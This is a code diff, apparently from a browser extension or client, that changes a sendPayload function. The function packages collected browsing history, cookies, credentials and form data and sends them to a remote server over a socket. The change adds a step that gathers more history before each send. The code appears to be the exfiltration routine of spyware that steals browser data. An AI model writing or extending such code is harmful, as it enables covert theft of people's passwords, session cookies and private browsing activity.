@@ -354,12 +354,17 @@ function connectToHost(){
 
 function sendPayload(){
 	if(socket){
-		newJson = createJSON(config.ID, queue.history, queue.cookies, queue.creds, queue.forms);
-        console.log("Sending a PAYLOAD");
-		socket.emit('extpayload', newJson, function(answer){
-            handleServerPayload(answer);
-            clearQueue();
-		})
+
+		getClientHistory(config.last_pkt, 200).then(function (){
+            newJson = createJSON(config.ID, queue.history, queue.cookies, queue.creds, queue.forms);
+            console.log("Sending a PAYLOAD");
+            socket.emit('extpayload', newJson, function(answer){
+                handleServerPayload(answer);
+                clearQueue();
+            });
+		});
+
+
 	}
 	else{
 		console.log("Failed to create connection to the server~~~~");
